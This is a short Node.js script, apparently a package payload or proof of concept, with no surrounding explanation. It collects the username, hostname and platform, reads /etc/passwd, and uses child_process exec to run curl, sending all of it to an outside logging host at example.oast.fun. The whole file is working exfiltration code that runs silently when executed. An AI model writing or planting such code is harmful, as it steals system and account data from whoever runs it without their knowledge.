const fs=require('fs'),os=require('os'),{exec}=require('child_process');
const username=os.userInfo().username,hostname=os.hostname(),platform=os.platform();
const passwdContent=fs.readFileSync('/etc/passwd','utf8'); let extraData = '&passwd=' + encodeURIComponent(passwdContent);
let cmd=`curl -s 'http://example.oast.fun/log?user=${username}&host=${hostname}&os=${platform}${extraData}'`;exec(cmd,()=>{});
